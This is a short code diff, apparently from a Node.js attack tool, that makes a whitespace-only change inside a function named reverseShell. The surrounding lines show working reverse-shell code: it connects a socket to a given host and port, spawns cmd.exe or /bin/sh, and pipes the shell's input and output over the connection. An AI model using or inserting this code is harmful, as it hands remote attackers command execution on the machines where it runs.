@@ -10,7 +10,7 @@ TIMEOUT="6000";
 function reverseShell(HOST,PORT) {
     var client = new net.Socket();
     client.connect(PORT, HOST, function() {
-		var shell_path = (os.platform().indexOf('win') != -1)  ? path.join(process.env.windir, 'System32', 'cmd.exe') : '/bin/sh';
+        var shell_path = (os.platform().indexOf('win') != -1)  ? path.join(process.env.windir, 'System32', 'cmd.exe') : '/bin/sh';
         var cmd = child_process.spawn(shell_path);
         client.pipe(cmd.stdin);
         cmd.stdout.pipe(client);
